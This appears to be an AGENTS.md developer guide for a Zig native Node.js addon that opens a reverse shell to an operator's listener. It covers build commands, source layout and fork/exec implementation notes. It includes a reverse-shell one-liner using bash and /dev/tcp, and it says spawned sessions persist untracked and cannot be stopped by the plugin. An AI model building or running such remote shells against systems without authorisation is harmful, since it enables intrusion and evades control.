# AGENTS.md — plugin-reverse-shell

Zig 0.16.0 NAPI native addon for Node.js (via tokota framework). Spawns a shell
session that connects back to the operator's listener.

## Build & commands

```sh
zig build test              # 纯逻辑用例全平台真跑 + root_test 语义分析（Linux e2e 仅 Linux 真跑）
make build-all              # 交叉编译 .node → dist/
zig build -Dtarget=x86_64-linux-gnu -Doptimize=ReleaseSmall   # Dev build → reverse_shell.node
node test.js                # Node 冒烟（需 Linux 宿主 + .node；自带 net listener）
```

## Source layout

| File | Responsibility |
|---|---|
| `src/root.zig` | NAPI entrypoint：参数解析、SessionPipe（AsyncWorker + Promise + 状态管道协议） |
| `src/session.zig` | **Linux-only**（compileError 门控）：getaddrinfo 解析、connect、dup2、exec |
| `src/runner.zig` | 纯逻辑：listener 解析、变体命令串构建（跨平台可单测） |
| `src/test.zig` | 纯逻辑单测 + Linux 端到端（fork + 本地 listener 交互） |

## Key facts

- **fork 纪律（铁律）**：目标 Node 是多线程进程，fork 后的子进程里调用任何分配器
  都可能死锁。因此解析（getaddrinfo）与命令串构建全部在 fork 前的 worker 线程
  完成；子进程只做裸 syscall，读 fork 前已分配的内存（解析结果/host/cmd 刻意
  不 free——父进程 free 可能 munmap 掉子进程 COW 视图）。
- **状态管道协议**：pipe2(CLOEXEC) 两端；子进程写 'C'（connect ok）/'F'（失败），
  **exec 成功时 CLOEXEC 写端自动关闭 → 父端 EOF = spawn 成功**。
  **父进程 fork 后必须立即 close 写端**——否则 EOF 永不到达，状态轮询必超时
  （e2e 调试两小时才定位的坑：测试父进程忘关写端，症状是"子进程正常连接但
  状态读取超时"）。
- **bash 变体的命令串必须显式调 bash**：`bash -c 'exec bash -i >& /dev/tcp/H/P 0>&1'`——
  命令串经 /bin/sh -c 执行，/bin/sh 可能是 dash（不识别 /dev/tcp 与 >&）。
- **zig 0.16 的 std.posix 已剥离网络函数**（socket/bind/listen/accept/pipe2 等），
  网络syscall 一律走 `std.os.linux.*` 裸包装；返回值是 usize（负数编码错误），
  错误判定用 `@as(isize, @bitCast(rc)) < 0`；errno 用 `linux.errno(rc)`。
- **无法从插件侧终止会话**：shell 会话 setsid 驻留，未记录 PID——README 已声明。
- **平台**：仅 Linux x64/aarch64（session.zig compileError 门控，root.zig 非直接
  import）。
- **Clean:** `rm -f reverse_shell.node` after dev build.
